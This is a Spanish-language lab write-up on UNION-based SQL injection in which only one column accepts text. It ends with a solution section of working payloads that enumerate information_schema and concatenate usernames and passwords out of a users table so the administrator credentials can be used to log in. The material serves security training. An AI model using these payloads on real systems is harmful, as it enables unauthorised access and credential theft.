En esta clase seguimos utilizando ataques SQL con UNION, pero enfrentamos una situación distinta: solo una de las columnas de la respuesta acepta datos tipo texto. Por eso, necesitamos combinar varios valores dentro de una sola columna para poder mostrarlos.

La tabla objetivo sigue siendo ‘**users**‘, que contiene los campos ‘**username**‘ y ‘**password**‘.

Pasos clave del ataque:

- Primero confirmamos que la consulta original devuelve dos columnas, pero solo una permite mostrar texto.
- En lugar de intentar mostrar ‘**username**‘ y ‘**password**‘ en columnas separadas (lo que daría error), los concatenamos dentro de la misma columna, usando un separador visible como ~.
- El payload final concatena los valores así: “**username || ‘~’ || password**“. Esto unifica ambos datos en una sola cadena que puede ser mostrada sin errores.

Al enviar esta inyección, la respuesta incluirá los nombres de usuario y sus contraseñas, separados por el símbolo elegido. Finalmente, usamos las credenciales del administrador para iniciar sesión y completar el lab.

**Quédate con esto**: Cuando no puedes mostrar varios valores por separado, combínalos en una sola columna textual. Esta técnica te permite seguir extrayendo información sensible en entornos más restringidos.


Solucion
mas de lo mismo pero concatenamos al ultimo
primero order by 
luego, ' union select NULL,schema_name from information_schema.schemata-- - 
Luego, ' union select NULL,table_name from information_schema.tables where table_schema='public'-- - 
Despues  ' union select NULL,schema_name from information_schema.schemata-- - 
Luego, ' union select NULL,table_name from information_schema.tables where table_schema='public'-- 
Luego ' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'--
Ultimo ' union select NULL,username||':'||password from users-- -